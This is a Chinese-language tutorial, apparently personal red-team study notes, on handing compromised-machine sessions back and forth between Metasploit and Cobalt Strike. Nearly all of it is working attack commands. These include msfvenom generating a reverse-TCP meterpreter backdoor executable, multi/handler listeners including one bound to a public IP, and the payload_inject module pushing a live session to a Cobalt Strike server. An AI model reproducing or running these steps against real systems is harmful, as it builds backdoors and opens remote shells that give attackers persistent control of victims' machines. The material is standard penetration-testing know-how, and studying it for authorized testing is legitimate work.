那么之前我们都单独学习了两个工具

那么一般情况就是我们 通过MSF打下来的机器 需要把shell转移到CS上

可以理解为 流量转发 是CS和MSF的关系 和被控机器无关

只有 TCP 的连接 才可以派生给别人

也就是我们的beacon需要是http/https类型的 并且我们选择监听器也需要对应的 才可以转发

# CS复制会话到MSF

步骤差不多如下：

1. CS构建外部监听器
2. MSF开启监听
3. CS指定会话里运行 spawn 外联监听器名字

先执行一个shell

![image-20260322132121060](https://raw.githubusercontent.com/Xioaruan912/pic/main/image-20260322132121060.png)

构建一个外联的监听器 其中的IP 是MSF的地址

![image-20260322133810308](https://raw.githubusercontent.com/Xioaruan912/pic/main/image-20260322133810308.png)

下面就进入MSF即可

```
use exploit/multi/handler
set payload  windows/meterpreter/reverse_http
set lhost 103.195.190.130
set lport 6767
run
```

那么这个时候 MSF配置结束 下面回到CS 进行转发

![image-20260322134042860](https://raw.githubusercontent.com/Xioaruan912/pic/main/image-20260322134042860.png)

# MSF的会话复制到CS

在CobaltStrike上新建一个监听器（Beacon HTTP）

先通过msfvenom生成后门文件

```
msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=192.168.158.129 LPORT=7777 -f exe > msfshell.exe
```

然后构建监听器

```
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set lhost 192.168.158.129 # msf所在主机的ip
set lport 7777 # msf所在主机自定义端口号，与后门文件中的一致
run
```

获取到会话后 挂载到后台

```
background

```

检查这个session是什么

```
sessions
```

调用 payload_inject 模块，将指定会话session id注入到新到CobaltStrike会话中

```
use exploit/windows/local/payload_inject
set payload windows/meterpreter/reverse_http
set lhost 192.168.158.129   # CS服务端IP
set lport 80       # CS服务端监听的端口号
set DisablePayloadHandler True
set PrependMigrate True
set session 4  # 会话id
run
```

这样就可以在cs中得到 我们的会话了